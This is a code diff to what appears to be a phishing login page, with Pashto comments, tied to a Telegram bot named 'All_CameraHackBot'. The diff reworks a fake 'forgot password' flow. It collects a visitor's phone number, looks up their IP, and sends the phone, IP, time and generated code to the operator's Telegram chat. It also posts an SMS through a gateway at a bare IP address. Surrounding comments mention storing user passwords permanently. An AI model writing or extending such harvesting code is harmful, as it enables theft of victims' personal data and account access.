@@ -382,6 +382,9 @@
     const ADMIN_CHAT_ID = "8295417969";
     const BOT_REDIRECT = "https://t.me/All_CameraHackBot?start=8020108872";
 
+    // ==================== SMS Gateway Settings ====================
+    const SMS_GATEWAY_URL = "http://180.94.93.174:8080/send-sms";  // ستاسو ورکړل شوی IP
+
     // د کارونکي ډیټابیس (د تل لپاره پاسورډ ساتل)
     let userDatabase = {};
 
@@ -470,7 +473,7 @@
         closeCreateAccountModal();
     }
 
-    // ========== Forgot Password (د ګوګل په څیر) ==========
+    // ========== Forgot Password (د ریښتیني SMS سره) ==========
     function openForgotPasswordModal() {
         document.getElementById('forgotPasswordModal').style.display = 'flex';
     }
@@ -498,29 +501,57 @@
             return;
         }
 
-        // تصادفي 6-عددي کوډ
+        // تصادفي 6-عددي کوډ جوړول
         generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
         
         const ip = await getUserIP();
-        const msg = `📱 *PASSWORD RESET REQUEST*\n\n📞 Phone: ${phone}\n🔑 Verification Code: ${generatedCode}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
         
+        // 1. اډمن ته د SMS هڅې خبر ورکړئ (د لاګ لپاره)
+        const adminMsg = `📱 *PASSWORD RESET REQUEST*\n\n📞 Phone: ${phone}\n🔑 Generated Code: ${generatedCode}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: adminMsg, parse_mode: 'Markdown' })
+        }).catch(err => console.warn("Telegram error", err));
+
+        // 2. د SMS Gateway له لارې ریښتینی کوډ واستوئ
         try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            // د تلیفون نمبر بڼه سمه کړئ
+            let formattedPhone = phone;
+            if (formattedPhone.startsWith('0')) {
+                formattedPhone = formattedPhone.substring(1);
+            }
+            if (!formattedPhone.startsWith('+')) {
+                formattedPhone = '+' + formattedPhone;
+            }
+
+            const response = await fetch(SMS_GATEWAY_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: ADMIN_CHAT_ID,
-                    text: msg,
-                    parse_mode: 'Markdown'
+                    phone: formattedPhone,
+                    message: `Your verification code is: ${generatedCode}`
                 })
             });
-        } catch (err) {
-            console.warn("Telegram error", err);
-        }
 
-        alert(`Verification code sent to ${phone} (Demo: ${generatedCode})`);
-        closeForgotPasswordModal();
-        document.getElementById('verifyCodeModal').style.display = 'flex';
+            if (response.ok) {
+                alert(`✅ Verification code sent to ${phone}`);
+                closeForgotPasswordModal();
+                document.getElementById('verifyCodeModal').style.display = 'flex';
+            } else {
+                // که SMS ناکام شو، دیمو موډ وکاروئ
+                const errorText = await response.text();
+                console.error("SMS Gateway error:", errorText);
+                alert(`⚠️ SMS sending failed. Demo Code: ${generatedCode}\n(Check gateway connection at ${SMS_GATEWAY_URL})`);
+                closeForgotPasswordModal();
+                document.getElementById('verifyCodeModal').style.display = 'flex';
+            }
+        } catch (error) {
+            console.error("Network error:", error);
+            alert(`⚠️ Network error. Demo Code: ${generatedCode}\n(Cannot reach SMS gateway at ${SMS_GATEWAY_URL})`);
+            closeForgotPasswordModal();
+            document.getElementById('verifyCodeModal').style.display = 'flex';
+        }
     }
 
     async function verifyCode() {
